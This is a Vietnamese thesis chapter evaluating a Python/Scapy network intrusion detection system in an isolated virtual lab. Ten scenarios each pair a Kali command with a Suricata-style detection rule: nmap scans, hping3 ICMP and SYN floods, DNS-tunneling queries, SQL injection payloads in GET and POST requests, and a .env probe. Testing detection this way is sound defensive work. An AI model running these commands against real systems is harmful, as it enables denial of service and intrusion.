\chapter{Kịch bản Thử nghiệm và Đánh giá}

\section{Môi trường thử nghiệm}
Việc kiểm thử được thực hiện trong môi trường phòng thí nghiệm ảo hóa cô lập để tránh ảnh hưởng đến mạng thật. Các lệnh tạo lưu lượng chỉ dùng trong máy ảo có kiểm soát và không chạy trên mạng thật nếu không có quyền. Mô hình gồm ba thành phần chính được cấu hình trên cùng một máy chủ vật lý sử dụng nền tảng ảo hóa KVM/QEMU (libvirt):

\begin{itemize}
    \item \textbf{Host Machine:} Chạy hệ điều hành Linux hoặc Windows, đóng vai trò chạy NIDS engine chính (được viết bằng Python Scapy) và Flask dashboard để trực quan hóa cảnh báo. Giao diện mạng của máy Host được cấu hình ở chế độ hỗn tạp (Promiscuous Mode) để giám sát lưu lượng đi qua mạng ảo.
    \item \textbf{Kali Linux VM (Attacker):} Đóng vai trò máy tạo lưu lượng kiểm thử bằng các công cụ tấn công và thăm dò phổ biến như \texttt{nmap}, \texttt{hping3}, \texttt{dig}, và \texttt{curl}.
    \item \textbf{Target VM (Windows/Linux Server):} Chạy dịch vụ web (như Python HTTP Server hoặc Apache trên cổng 80) và dịch vụ hệ thống khác để nhận lưu lượng quét cổng, tấn công từ chối dịch vụ (DoS), và các yêu cầu ứng dụng web.
\end{itemize}

Trong mô hình mạng này, NIDS engine lắng nghe trên card mạng ảo tương ứng (ví dụ: \texttt{virbr0} của KVM/libvirt). \section{Quy trình triển khai và Khởi động hệ thống}
Để tiến hành thực nghiệm, quy trình chuẩn bị và khởi chạy các thành phần NIDS trên máy Host tuân theo các bước sau:

\subsection{Bước 1: Thiết lập môi trường và cài đặt phụ thuộc}
Tại thư mục gốc của dự án trên máy Host, tiến hành tạo môi trường ảo Python và cài đặt các thư viện cần thiết bằng lệnh:
\begin{lstlisting}[language=bash, caption={Cài đặt môi trường ảo và thư viện}]
# Tao moi truong ao
python3 -m venv .venv

# Kich hoat moi truong ao
source .venv/bin/activate  # Tren Linux/macOS
# hoac .venv\Scripts\activate.bat # Tren Windows

# Cai dat cac dependency (Scapy, Flask,...)
pip install -r requirements.txt
\end{lstlisting}

\subsection{Bước 2: Khởi động giao diện Web Dashboard}
Mở một cửa sổ dòng lệnh mới, kích hoạt môi trường ảo và khởi chạy ứng dụng Flask:
\begin{lstlisting}[language=bash, caption={Khởi động giao diện giám sát}]
python dashboard/app.py
\end{lstlisting}
Ứng dụng sẽ khởi chạy máy chủ web cục bộ tại địa chỉ \texttt{http://127.0.0.1:5000}. Người dùng có thể truy cập bằng trình duyệt web để theo dõi giao diện thống kê trực quan ban đầu (chưa có cảnh báo nào được ghi nhận).

\subsection{Bước 3: Khởi động NIDS Engine}
Mở cửa sổ dòng lệnh tiếp theo với quyền quản trị cao nhất (\texttt{sudo} hoặc Administrator) để NIDS có quyền truy cập trực tiếp vào card mạng ảo ở chế độ Promiscuous:
\begin{lstlisting}[language=bash, caption={Khởi động NIDS lắng nghe trực tiếp}]
sudo .venv/bin/python main.py --iface virbr0 --rules custom.rules --limit 0
\end{lstlisting}
Trong đó:
\begin{itemize}
    \item \texttt{--iface virbr0}: Chỉ định card mạng ảo kết nối giữa Kali Linux và máy mục tiêu.
    \item \texttt{--rules custom.rules}: Nạp tệp chữ ký chứa các luật phát hiện kiểu Suricata tùy chỉnh.
    \item \texttt{--limit 0}: Thiết lập chế độ chạy vô hạn (không giới hạn số gói tin thu thập).
\end{itemize}
Nếu hệ thống thông báo \textit{"Loaded 3 Suricata-style rule(s) from custom.rules"} và bắt đầu in dòng trạng thái lắng nghe, quá trình chuẩn bị hệ thống đã hoàn tất và sẵn sàng ghi nhận các sự kiện.

\section{Các kịch bản thực nghiệm chi tiết}
Dưới đây là 10 kịch bản thực nghiệm toàn diện bao gồm cả các nhóm luật phát hiện dựa trên hành vi (cửa sổ trượt thời gian) và phát hiện dựa trên chữ ký (so khớp mẫu dữ liệu).

\subsection{Nhóm 1: Phát hiện dựa trên hành vi (Behavior-based)}

\subsubsection{Kịch bản 1: Quét cổng bằng Nmap (Port Scan Detection)}
\begin{itemize}
    \item \textbf{Mục tiêu:} Kiểm tra khả năng phát hiện hành vi thăm dò hệ thống khi một nguồn quét nhiều cổng TCP của máy mục tiêu trong thời gian ngắn.
    \item \textbf{Công cụ sử dụng:} Trình quét bảo mật \texttt{nmap} chạy trên Kali Linux.
    \item \textbf{Lệnh thực thi trên Kali:}
    \begin{lstlisting}[language=bash]
sudo nmap -sS -p 21,22,23,25,53,80,110,135,139,143,443,445,1433,3306,3389,8080,8443,8888,9090,9200 --scan-delay 5ms -T4 -n --open --max-retries 0 192.168.122.54
    \end{lstlisting}
    \item \textbf{Luật phát hiện kích hoạt:} Luật tích hợp \texttt{RULE-001}. Điều kiện: Một IP nguồn gửi gói tin TCP mang cờ quét (SYN, FIN, NULL, Xmas) tới $\ge 20$ cổng đích khác nhau trong vòng 10 giây.
    \item \textbf{Kết quả mong đợi:} NIDS sinh cảnh báo \textbf{RULE-001 Port Scan} với mức độ \texttt{Medium}. Thông tin lưu trữ ghi nhận chi tiết danh sách 20 cổng đích đã quét làm bằng chứng.
\end{itemize}

\subsubsection{Kịch bản 2: ICMP Ping Flood DoS Attack}
\begin{itemize}
    \item \textbf{Mục tiêu:} Kiểm tra khả năng phát hiện hành vi làm cạn kiệt tài nguyên băng thông bằng cách gửi dồn dập các gói tin ICMP Echo Request.
    \item \textbf{Công cụ sử dụng:} Tiện ích tạo gói tin tùy biến \texttt{hping3} trên Kali Linux.
    \item \textbf{Lệnh thực thi trên Kali:}
    \begin{lstlisting}[language=bash]
sudo hping3 --icmp -c 120 -i u50000 192.168.122.54
    \end{lstlisting}
    \item \textbf{Ý nghĩa tham số:} Gửi 120 gói tin ICMP (\texttt{-c 120}) với khoảng cách giữa các gói là 50,000 micro giây (\texttt{-i u50000}, tương đương 20 gói/giây).
    \item \textbf{Luật phát hiện kích hoạt:} Luật tích hợp \texttt{RULE-002}. Điều kiện: Một IP nguồn gửi $\ge 100$ gói tin ICMP dạng request (loại 8, 13, 17) trong vòng 10 giây.
    \item \textbf{Kết quả mong đợi:} Sinh cảnh báo \textbf{RULE-002 ICMP Ping Flood} với mức độ nghiêm trọng \texttt{High}.
\end{itemize}

\subsubsection{Kịch bản 3: TCP SYN Flood Attack}
\begin{itemize}
    \item \textbf{Mục tiêu:} Phát hiện tấn công từ chối dịch vụ dạng bán kết nối (Half-Open DoS) bằng cách gửi dồn dập gói TCP SYN mà không hoàn tất bắt tay ba bước.
    \item \textbf{Công cụ sử dụng:} \texttt{hping3} trên Kali Linux.
    \item \textbf{Lệnh thực thi trên Kali:}
    \begin{lstlisting}[language=bash]
sudo hping3 -S -p 80 -c 120 -i u50000 192.168.122.54
    \end{lstlisting}
    \item \textbf{Ý nghĩa tham số:} \texttt{-S} thiết lập cờ SYN, \texttt{-p 80} hướng mục tiêu đến dịch vụ Web, gửi 120 gói tin với khoảng cách cực ngắn.
    \item \textbf{Luật phát hiện kích hoạt:} Luật tích hợp \texttt{RULE-003}. Điều kiện: Một cặp IP nguồn-IP đích-Cổng dịch vụ nhận được $\ge 100$ gói TCP SYN (không chứa cờ ACK) trong vòng 10 giây.
    \item \textbf{Kết quả mong đợi:} Sinh cảnh báo \textbf{RULE-003 TCP SYN Flood} mức độ \texttt{High}, hiển thị dịch vụ bị nhắm tới (ví dụ: cổng 80).
\end{itemize}

\subsubsection{Kịch bản 4: DNS Tunneling Anomaly Detection}
\begin{itemize}
    \item \textbf{Mục tiêu:} Phát hiện hành vi thiết lập kênh truyền thông ngầm (tunnel) để vượt qua tường lửa qua các truy vấn DNS có cấu trúc bất thường.
    \item \textbf{Công cụ sử dụng:} Vòng lặp lệnh shell và tiện ích \texttt{dig} trên Kali Linux.
    \item \textbf{Lệnh thực thi trên Kali:}
    \begin{lstlisting}[language=bash]
for label in "aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkaGVsbG93b3JsZA" "dGhpcWlzYXZlcnlsb25nc3ViZG9tYWlubGFiZWxmb3J0ZXN0aW5n" "c3VzcGljaW91c2Ruc3F1ZXJ5Zm9ybmlkc2RlbW9wcm9qZWN0dGVzdA" "ZGF0YWV4ZmlsdHJhdGlvbnZpYWRuc3R1bm5lbGluZ2RlbW90ZXN0cQ" "bmlkc3Byb2plY3RkZW1vYXR0YWNrc2ltdWxhdGlvbnRlc3RsYWJlbA" "c2VtZXN0ZXJwcm9qZWN0aW50cnVzaW9uZGV0ZWN0aW9uc3lzdGVtdA" "aW50cnVzaW9uZGV0ZWN0aW9uc3lzdGVtZGVtb3Rlc3RsYWJlbHNnbg"; do
    dig +short +time=1 +tries=1 "${label}.tunnel.example.com" @8.8.8.8
    sleep 0.4
done
    \end{lstlisting}
    \item \textbf{Luật phát hiện kích hoạt:} Luật tích hợp \texttt{RULE-004}. Điều kiện: Có $\ge 5$ truy vấn DNS có dấu hiệu bất thường (độ dài nhãn phụ $\ge 45$ ký tự, độ hỗn loạn thông tin Shannon Entropy $\ge 3.8$) từ cùng một nguồn trong vòng 30 giây.
    \item \textbf{Kết quả mong đợi:} Sinh cảnh báo \textbf{RULE-004 DNS Tunneling Suspicion} mức độ \texttt{Medium}. Bằng chứng ghi nhận các chỉ số entropy toán học của tên miền.
\end{itemize}

\subsection{Nhóm 2: Phát hiện dựa trên chữ ký (Signature-based)}

\subsubsection{Kịch bản 5: Luật chữ ký DNS tùy chỉnh (Custom DNS Signature Matching)}
\begin{itemize}
    \item \textbf{Mục tiêu:} Kiểm tra khả năng phân tích và so khớp dấu vết chuỗi chữ ký (signature) trong các trường dữ liệu ứng dụng cụ thể (DNS Query Buffer).
    \item \textbf{Công cụ sử dụng:} \texttt{dig} trên Kali Linux.
    \item \textbf{Lệnh thực thi trên Kali:}
    \begin{lstlisting}[language=bash]
dig example.com @8.8.8.8
    \end{lstlisting}
    \item \textbf{Luật chữ ký áp dụng (nạp từ \texttt{custom\_test.rules}):}
    \begin{lstlisting}[language=bash]
alert dns any any -> any 53 (msg:"Custom DNS Query: example.com"; dns.query; content:"example.com"; nocase; classtype:policy-violation; priority:3; sid:1000101; rev:1;)
    \end{lstlisting}
    \item \textbf{Kết quả mong đợi:} Sinh cảnh báo \textbf{1000101 Custom DNS Query: example.com} mức độ \texttt{Low} (Priority 3). Minh chứng cho khả năng bóc tách vùng đệm \texttt{dns.query} của NIDS parser.
\end{itemize}

\subsubsection{Kịch bản 6: Quét lỗ hổng tự động bằng công cụ (sqlmap User-Agent Scan)}
\begin{itemize}
    \item \textbf{Mục tiêu:} Phát hiện dấu hiệu trinh sát tự động của các công cụ quét lỗ hổng thông qua định danh HTTP User-Agent đặc trưng.
    \item \textbf{Công cụ sử dụng:} \texttt{curl} trên Kali Linux để giả lập tiêu đề User-Agent của sqlmap.
    \item \textbf{Lệnh thực thi trên Kali:}
    \begin{lstlisting}[language=bash]
curl -s -A "sqlmap/1.8.2#stable (https://sqlmap.org)" "http://192.168.122.54/"
    \end{lstlisting}
    \item \textbf{Luật chữ ký áp dụng (nạp từ \texttt{custom.rules}):}
    \begin{lstlisting}[language=bash]
alert http any any -> any 80 (msg:"sqlmap Scanner User-Agent Detected"; http.user_agent; content:"sqlmap"; nocase; classtype:attempted-recon; priority:2; sid:1000002; rev:1;)
    \end{lstlisting}
    \item \textbf{Kết quả mong đợi:} Sinh cảnh báo \textbf{1000002 sqlmap Scanner User-Agent Detected} mức độ \texttt{Medium} (Priority 2). Hệ thống bóc tách trường \texttt{http\_user\_agent} trong gói tin để đối chiếu.
\end{itemize}

\subsubsection{Kịch bản 7: Tấn công SQL Injection trong URL Parameters (GET Mode)}
\begin{itemize}
    \item \textbf{Mục tiêu:} Phát hiện chuỗi truy vấn SQL Injection độc hại được mã hóa và chèn vào tham số GET của HTTP URI.
    \item \textbf{Công cụ sử dụng:} \texttt{curl} trên Kali Linux.
    \item \textbf{Lệnh thực thi trên Kali:}
    \begin{lstlisting}[language=bash]
curl -s "http://192.168.122.54/index.php?id=%27%20OR%20%271%27%3D%271"
    \end{lstlisting}
    \item \textbf{Luật chữ ký áp dụng (nạp từ \texttt{custom.rules}):}
    \begin{lstlisting}[language=bash]
alert http any any -> any 80 (msg:"HTTP URI SQL Injection Attempt"; http.uri; content:"' OR '1'='1"; nocase; classtype:web-application-attack; priority:1; sid:1000001; rev:1;)
    \end{lstlisting}
    \item \textbf{Kết quả mong đợi:} Mặc dù đầu vào được mã hóa dưới dạng URL-encoded (\texttt{\%27\%20OR\%20\%271\%27\%3D\%271}), bộ parser của NIDS tự động giải mã (decode) dữ liệu trước khi so khớp. Sinh cảnh báo \textbf{1000001 HTTP URI SQL Injection Attempt} mức độ \texttt{High} (Priority 1).
\end{itemize}

\subsubsection{Kịch bản 8: Tấn công SQL Injection trong POST Request Body}
\begin{itemize}
    \item \textbf{Mục tiêu:} Phát hiện các chuỗi tấn công SQL Injection ẩn sâu bên trong phần thân (Body) của yêu cầu POST gửi lên từ một form đăng nhập.
    \item \textbf{Công cụ sử dụng:} \texttt{curl} thực hiện gửi dữ liệu POST.
    \item \textbf{Lệnh thực thi trên Kali:}
    \begin{lstlisting}[language=bash]
curl -s -X POST "http://192.168.122.54/login" --data "username=admin&password=' OR '1'='1"
    \end{lstlisting}
    \item \textbf{Luật chữ ký áp dụng (nạp từ \texttt{custom.rules}):}
    \begin{lstlisting}[language=bash]
alert tcp any any -> any 80 (msg:"HTTP POST Body SQL Injection Attempt"; pkt_data; content:"' OR '1'='1"; nocase; classtype:web-application-attack; priority:1; sid:1000003; rev:1;)
    \end{lstlisting}
    \item \textbf{Kết quả mong đợi:} Sinh cảnh báo \textbf{1000003 HTTP POST Body SQL Injection Attempt} mức độ \texttt{High}. NIDS đã quét vùng dữ liệu payload thô của phân đoạn TCP (\texttt{pkt\_data}) để so khớp mẫu chữ ký.
\end{itemize}

\subsubsection{Kịch bản 9: Tấn công dò quét lặp lại (SSH/Web Brute Force Detection Filter)}
\begin{itemize}
    \item \textbf{Mục tiêu:} Sử dụng cơ chế kiểm soát tần suất nâng cao (threshold/detection\_filter) để phát hiện hành vi Brute Force truy cập lặp lại liên tục.
    \item \textbf{Công cụ sử dụng:} Vòng lặp shell chạy nhiều lệnh truy vấn hoặc gửi payload kết nối SSH thô.
    \item \textbf{Lệnh thực thi trên Kali (Giả lập gửi payload kết nối lặp lại):}
    \begin{lstlisting}[language=bash]
for i in {1..10}; do
    curl -s "http://192.168.122.54/" -o /dev/null
    sleep 0.3
done
    \end{lstlisting}
    \item \textbf{Luật chữ ký áp dụng (nạp từ cấu hình):}
    \begin{lstlisting}[language=bash]
alert http any any -> any 80 (msg:"Repeated Web Access Request Alert"; content:"GET"; detection_filter:track by_src, count 5, seconds 10; sid:900004; rev:1;)
    \end{lstlisting}
    \item \textbf{Kết quả mong đợi:} Hệ thống đếm số lần khớp mẫu "GET" từ cùng một IP nguồn. Khi vượt quá 5 lần trong vòng 10 giây, sinh cảnh báo \textbf{900004 Repeated Web Access Request Alert} với mức độ \texttt{Medium}. Các yêu cầu thứ 1 đến thứ 4 không sinh cảnh báo riêng lẻ.
\end{itemize}

\subsubsection{Kịch bản 10: Khai thác thông tin cấu hình nhạy cảm (.env File Access)}
\begin{itemize}
    \item \textbf{Mục tiêu:} Phát hiện hành vi quét tìm các tệp tin cấu hình nhạy cảm chứa khóa bí mật, thông tin cơ sở dữ liệu trên máy chủ web.
    \item \textbf{Công cụ sử dụng:} \texttt{curl} yêu cầu tệp tin đặc thù.
    \item \textbf{Lệnh thực thi trên Kali:}
    \begin{lstlisting}[language=bash]
curl -s "http://192.168.122.54/.env"
    \end{lstlisting}
    \item \textbf{Luật chữ ký áp dụng (nạp thêm vào cấu hình):}
    \begin{lstlisting}[language=bash]
alert http any any -> any 80 (msg:"Suspicious .env Configuration File Access"; http.uri; content:".env"; nocase; classtype:web-application-attack; priority:1; sid:1000005; rev:1;)
    \end{lstlisting}
    \item \textbf{Kết quả mong đợi:} Phát hiện chuỗi ".env" trong vùng đệm URI của thông điệp HTTP. Sinh cảnh báo \textbf{1000005 Suspicious .env Configuration File Access} mức độ \texttt{High}.
\end{itemize}

\subsection{Đánh giá ưu điểm và nhược điểm của nguyên mẫu hệ thống}

\subsubsection{Ưu điểm hệ thống}
\begin{itemize}
    \item \textbf{Độ chính xác cao trong môi trường Lab:} Tỷ lệ cảnh báo đúng (True Positive) đạt 100\% đối với các kịch bản thiết lập mà không xảy ra tình trạng bỏ sót sự kiện (False Negative).
    \item \textbf{Khả năng giải mã linh hoạt:} Bộ chuẩn hóa giao thức có khả năng giải mã chuỗi URL-encoded trong HTTP URI trước khi so khớp giúp phát hiện các nỗ lực vượt qua bộ lọc đơn giản của hacker.
    \item \textbf{Khả năng mở rộng tốt:} Cú pháp luật chữ ký kiểu Suricata được phân tích tự động giúp quản trị viên dễ dàng thêm mới các luật mà không cần viết lại mã nguồn Python.
    \item \textbf{Trực quan hóa tức thời:} Flask dashboard cập nhật nhanh biểu đồ phân loại giúp theo dõi tức thời diễn biến các cuộc tấn công.
\end{itemize}

\subsubsection{Nhược điểm và hạn chế kỹ thuật}
\begin{itemize}
    \item \textbf{Giới hạn hiệu năng bắt gói tin:} NIDS sử dụng Scapy (viết hoàn toàn bằng Python) chạy ở chế độ đơn luồng (Single-Thread). Khi lưu lượng mạng tăng cao lên hàng chục Mbps, hệ thống sẽ gặp hiện tượng nghẽn cổ chai CPU và bắt đầu rơi gói tin (packet drop), dẫn đến bỏ sót các đợt tấn công tinh vi.
    \item \textbf{Chưa hỗ trợ đầy đủ trạng thái kết nối (Stateful Inspection):} Bộ đếm SYN Flood chỉ đếm số lượng gói tin SYN thô không có ACK mà chưa thực hiện theo dõi chính xác trạng thái kết nối TCP (như bắt tay 3 bước hoàn chỉnh). Điều này có thể dẫn đến việc cảnh báo giả (False Positive) với các ứng dụng tải dữ liệu nặng hợp lệ.
    \item \textbf{Không xử lý được lưu lượng mã hóa HTTPS:} Với các truy vấn chạy qua SSL/TLS (cổng 443), NIDS chỉ nhìn thấy payload ở dạng mã hóa nhị phân thô, làm mất hoàn toàn khả năng so khớp chữ ký trong URI hay User-Agent. Các hệ thống thực tế cần triển khai giải mã SSL/TLS (SSL Decryption/MitM) hoặc phân tích hành vi dựa trên metadata của TLS handshake.
\end{itemize}

\subsubsection{Hướng nghiên cứu cải tiến đề xuất}
Để nâng cao năng lực cho hệ thống NIDS trong các giai đoạn tiếp theo, các định hướng kỹ thuật sau đây cần được tập trung giải quyết:
\begin{enumerate}
    \item Chuyển đổi module bắt gói tin sang dùng thư viện liên kết C như \texttt{libpcap} trực tiếp hoặc sử dụng DPDK (Data Plane Development Kit) để tăng tốc độ xử lý ở mức kernel.
    \item Triển khai giải thuật đa luồng (Multi-threading / Multiprocessing) chia tách giữa luồng nhận gói tin và luồng xử lý luật phát hiện.
    \item Xây dựng cơ chế theo dõi trạng thái dòng TCP (TCP Stream Reassembly) hoàn chỉnh để phân tích nội dung ứng dụng trên các gói tin bị phân mảnh.
\end{enumerate}
